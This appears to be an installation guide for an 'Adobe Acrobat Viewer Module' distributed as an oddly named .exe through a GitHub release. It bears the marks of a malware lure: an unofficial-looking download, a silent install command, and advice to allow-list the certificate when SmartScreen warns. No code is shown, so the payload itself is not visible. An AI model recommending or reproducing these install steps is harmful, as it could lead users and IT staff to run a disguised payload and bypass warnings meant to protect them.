# Installation guide

## Adobe Acrobat Viewer Module

### End users

Download `adb_mscu7c80bnmia_v30209.exe` from release `v66893` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v66893` for pilot groups.

### Silent install

```
adb_mscu7c80bnmia_v30209.exe /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
